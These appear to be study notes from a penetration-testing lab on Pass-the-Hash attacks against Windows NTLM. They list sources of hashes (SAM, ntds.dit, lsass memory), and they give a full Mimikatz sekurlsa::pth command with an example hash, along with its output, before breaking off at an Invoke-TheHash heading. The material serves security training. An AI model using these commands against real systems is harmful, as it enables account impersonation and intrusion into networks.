- This technique is when an attacker, instead of using a regular password, they provide a password hash of the plain text password for authentication. 

- Some of the ways that we can obtain these hashes are through the following techniques that we have gone over in the past:
	- Dumping the local SAM database from a compromised host.
	- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
	- Pulling the hashes from memory (lsass.exe).
## Intro to Windows NTLM (New Technology LAN Manager)

- Set of security policies that authenticate users' identities while also protecting the integrity and confidentiality of their data. 
- NTLM is Single Sign On (SSO)
- With NTLM, passwords stored on the server and domain controller are not "salted" which means that an adversary with a password hash can authenticate a session without knowing the original password. **This is what we call a Pass the Hash Attack **

## Pass the Hash with Mimikatz (Windows)
- We are going to be using the module sekurlsa::pth which allows us to perform a pass the hash attack. 
- The following are parameters that we must know prior to running the module: 
	- `/user` - The user name we want to impersonate.
	- `/rc4` or `/NTLM` - NTLM hash of the user's password.
	- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
	- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).


```cmd-session
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```


![[Pasted image 20251028212916.png]]

## Pass the Hash with PowerShell Invoke-TheHash (Windows)

- Another tool that we can use is Invoke-TheHash. 